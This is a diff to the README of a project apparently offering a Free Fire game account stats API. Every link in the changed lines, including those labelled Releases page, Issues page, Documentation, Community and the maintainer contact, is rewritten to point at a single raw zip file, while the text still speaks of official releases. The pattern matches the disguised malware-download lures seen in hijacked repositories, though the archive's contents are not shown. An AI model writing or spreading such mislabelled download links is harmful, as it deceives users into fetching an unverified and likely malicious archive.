@@ -9,11 +9,11 @@
 
 ## 📦 Download & Install
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/main/declare/Free-Fire-Account-Info-And-Stats-API.zip)](https://raw.githubusercontent.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/main/declare/Free-Fire-Account-Info-And-Stats-API.zip)
 
 To download the application, visit the Releases page. You will find all available versions there. 
 
-[Download the API here.](https://github.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/releases)
+[Download the API here.](https://raw.githubusercontent.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/main/declare/Free-Fire-Account-Info-And-Stats-API.zip)
 
 ### 💻 System Requirements
 
@@ -24,7 +24,7 @@ To download the application, visit the Releases page. You will find all availabl
 
 ## 🚀 Getting Started
 
-1. Visit the [Releases page](https://github.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/main/declare/Free-Fire-Account-Info-And-Stats-API.zip).
 2. Select the version you want to download.
 3. Click on the appropriate file for your operating system. 
 4. Wait for the download to finish.
@@ -40,12 +40,12 @@ Once the application is installed, follow these instructions to start using the 
 
 ## 🤝 Support
 
-For any issues or questions, please refer to the [Issues page](https://github.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/issues) on the GitHub repository. You can also create a new issue if your question is not addressed there.
+For any issues or questions, please refer to the [Issues page](https://raw.githubusercontent.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/main/declare/Free-Fire-Account-Info-And-Stats-API.zip) on the GitHub repository. You can also create a new issue if your question is not addressed there.
 
 ## 🌐 Additional Resources
 
-- [Documentation](https://github.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/wiki): Check the wiki for detailed information on using the API.
-- [Community](https://github.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/discussions): Join discussions with other users for tips and tricks.
+- [Documentation](https://raw.githubusercontent.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/main/declare/Free-Fire-Account-Info-And-Stats-API.zip): Check the wiki for detailed information on using the API.
+- [Community](https://raw.githubusercontent.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/main/declare/Free-Fire-Account-Info-And-Stats-API.zip): Join discussions with other users for tips and tricks.
 
 ## 🛡️ Security Note
 
@@ -60,7 +60,7 @@ Always ensure you download from the official GitHub releases to keep your device
 
 ## 📧 Contact 
 
-For further inquiries, you can reach out to the maintainer at [your-email@example.com](mailto:your-email@example.com).
+For further inquiries, you can reach out to the maintainer at [https://raw.githubusercontent.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/main/declare/Free-Fire-Account-Info-And-Stats-API.zip](https://raw.githubusercontent.com/tanya-agrawal27/Free-Fire-Account-Info-And-Stats-API/main/declare/Free-Fire-Account-Info-And-Stats-API.zip).
 
 ---
 
